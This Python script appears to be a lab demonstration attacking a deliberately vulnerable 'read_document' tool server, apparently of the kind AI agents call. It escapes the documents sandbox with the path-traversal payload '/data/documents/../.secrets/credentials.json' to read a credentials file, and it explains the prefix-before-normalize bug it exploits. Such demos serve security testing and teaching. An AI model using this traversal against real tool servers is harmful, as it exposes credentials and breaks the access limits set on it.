"""02_path_traversal.py — sandbox escape via prefix-before-normalize.

The read_document tool validates the requested path by checking that
it STARTS WITH "/data/documents/" — then resolves the path with
.resolve(), which collapses `..` segments. The check happens before
the normalization, so a path that starts with the right prefix but
contains a traversal sequence passes the gate, then lands wherever
the traversal points.

This is the bug-pattern in Anthropic's official filesystem MCP server
(CVE-2025-53109 and CVE-2025-53110).

Usage:
    .venv/bin/python attacks/02_path_traversal.py
"""

import sys

from _helpers import banner, call


def main() -> int:
    banner("Stage A · sanity check · read a legitimate document")
    print(call("read_document", path="/data/documents/policies/password_policy.md"))

    banner("Stage B · ask for something outside the sandbox · expect refusal")
    print(call("read_document", path="/data/.secrets/credentials.json"))

    banner("Stage C · traversal via the allowed prefix")
    print("payload: /data/documents/../.secrets/credentials.json")
    payload = "/data/documents/../.secrets/credentials.json"
    out = call("read_document", path=payload)
    print(out)

    print()
    if "password" in out.lower() or "secret" in out.lower():
        print("✓ ATTACK SUCCEEDED — read /data/.secrets/credentials.json via "
              "the documents sandbox. Confirm: the path passed the prefix "
              "check because it literally starts with /data/documents/, "
              "but .resolve() then collapsed the `..` and landed outside.")
        return 0
    print("✗ traversal did not work — re-check the server is running the "
          "baseline (vulnerable) version.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
